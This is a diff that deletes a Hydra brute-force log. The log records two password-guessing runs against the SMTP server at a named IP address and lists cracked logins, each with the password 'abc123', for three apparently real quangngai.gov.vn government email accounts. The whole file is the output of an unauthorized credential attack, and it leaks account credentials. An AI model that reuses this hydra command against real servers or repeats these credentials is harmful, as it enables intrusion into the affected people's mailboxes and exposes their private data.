@@ -1,7 +1,0 @@
-# Hydra v7.5 run at 2013-12-28 14:19:43 on 203.162.230.139 smtp (hydra  -w 8 -W 8 -t 8 -L /home/fr33/share/quang_ngai/mail.quangngai -P /home/fr33/share/quang_ngai/pass.lst -o smtp.log 203.162.230.139 smtp)
-# Hydra v7.5 run at 2013-12-28 14:21:52 on 203.162.230.139 smtp (hydra  -w 8 -W 8 -t 8 -L /home/fr33/share/quang_ngai/mail.quangngai -P /home/fr33/share/quang_ngai/pass.lst -o smtp.log 203.162.230.139 smtp)
-[25][smtp] host: 203.162.230.139   login: cangvu@quangngai.gov.vn   password: abc123
-[25][smtp] host: 203.162.230.139   login: cangvu@quangngai.gov.vn   password: abc123
-[25][smtp] host: 203.162.230.139   login: chauo@quangngai.gov.vn   password: abc123
-[25][smtp] host: 203.162.230.139   login: chauo@quangngai.gov.vn   password: abc123
-[25][smtp] host: 203.162.230.139   login: dhpvd@quangngai.gov.vn   password: abc123
